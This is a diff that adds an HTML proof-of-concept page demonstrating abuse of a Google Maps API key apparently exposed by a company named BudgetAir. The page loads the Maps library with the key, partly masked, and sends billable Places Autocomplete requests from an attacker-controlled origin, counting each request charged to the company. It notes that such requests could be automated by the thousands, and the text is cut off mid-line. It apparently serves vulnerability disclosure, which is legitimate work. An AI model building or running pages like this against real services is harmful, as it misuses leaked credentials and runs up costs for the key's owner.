@@ -1,1 +1,68 @@
-<script src='https://maps.googleapis.com/maps/api/js?key=&libraries=places'></script><input id=a placeholder='Type a city'><script>new google.maps.places.Autocomplete(document.getElementById('a'))</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PoC — BudgetAir Google Maps API Key Abuse</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    input { width: 100%; max-width: 500px; padding: 10px; font-size: 16px; }
+    #results { margin-top: 15px; border: 1px solid #ccc; padding: 10px; background: #f9f9f9; }
+    .prediction { padding: 5px 0; border-bottom: 1px solid #eee; }
+    .status { color: red; font-weight: bold; margin: 10px 0; }
+    .note { color: #666; font-size: 0.9em; }
+  </style>
+</head>
+<body>
+  <h1>BudgetAir Exposed Google Maps API Key - Live PoC</h1>
+  
+  <p><strong>Impact:</strong> This page uses BudgetAir's exposed API key to perform billable Google Places Autocomplete requests from an attacker-controlled origin.</p>
+  
+  <input id="input" type="text" placeholder="Type a city or airport (e.g. Amsterdam, Schiphol, New York)" />
+  
+  <div id="status" class="status">Ready. Type above to trigger requests billed to BudgetAir.</div>
+  
+  <div id="results"></div>
+  
+  <p class="note">Each request to the Places Autocomplete service is billable under Google Maps Platform pricing (Places library). In a real attack, an attacker could automate thousands of these requests.</p>
+  
+  <p class="note">Open DevTools (F12) → Network tab (filter "autocomplete") to see the actual API calls and responses. Console will log the full data.</p>
+
+  <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBujHtniC3IyqfuvEzxl4******-1AWXCM&libraries=places"></script>
+  
+  <script>
+    const input = document.getElementById('input');
+    const statusEl = document.getElementById('status');
+    const resultsEl = document.getElementById('results');
+
+    let service;
+    let requestCount = 0;
+
+    function initService() {
+      if (typeof google === 'undefined' || !google.maps || !google.maps.places) {
+        statusEl.innerText = 'Error: Google Maps Places library failed to load. Key may be restricted or invalid.';
+        return;
+      }
+      service = new google.maps.places.AutocompleteService();
+      statusEl.innerText = 'Service initialized. Type in the box to generate billable requests on BudgetAir\'s key.';
+    }
+
+    input.addEventListener('input', () => {
+      const value = input.value.trim();
+      if (!value || value.length < 2) {
+        resultsEl.innerHTML = '';
+        return;
+      }
+      if (!service) {
+        statusEl.innerText = 'Service not ready.';
+        return;
+      }
+
+      requestCount++;
+      service.getPlacePredictions({ input: value }, (predictions, status) => {
+        if (status === google.maps.places.PlacesServiceStatus.OK && predictions && predictions.length > 0) {
+          statusEl.innerHTML = `Billed to BudgetAir: ${predictions.length} predictions returned (request #${requestCount}).`;
+          
+          let html = '<strong>Actual autocomplete results returned by the API:</strong><ul>';
+          predictions.forEach((p) => {
+            html += `<li class="prediction">${p.description} <small>(place_id:
